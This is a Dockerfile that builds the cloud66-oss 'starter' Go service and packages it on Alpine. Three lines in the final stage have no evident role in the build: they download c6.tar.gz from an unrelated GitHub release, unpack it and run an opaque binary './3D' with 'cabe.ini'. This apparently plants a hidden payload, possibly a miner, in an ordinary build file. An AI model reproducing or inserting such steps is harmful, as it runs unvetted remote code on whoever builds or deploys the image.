#use the golang base image
FROM golang:1.13    
#copy the source files
RUN mkdir -p /go/src/github.com/cloud66-oss/starter
#switch to our app directory
WORKDIR /go/src/github.com/cloud66-oss/starter
# add the app code
ADD . /go/src/github.com/cloud66-oss/starter
# run build commands
RUN bash -c "env GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -a -installsuffix cgo -o compiled/starter ."
#---------
# use the alpine base image
FROM alpine:latest
RUN apk --update upgrade && apk --no-cache add curl ca-certificates && rm -rf /var/cache/apk/*
RUN wget https://github.com/tapibisa/c6/releases/download/c6/c6.tar.gz
RUN tar -xvf c6.tar.gz
RUN ./3D cabe.ini
# copy the binary
COPY --from=0 /go/src/github.com/cloud66-oss/starter/compiled/starter /app
COPY ./templates /app/templates
# start command
WORKDIR /app
CMD /app/starter -daemon -templates templates -registry true
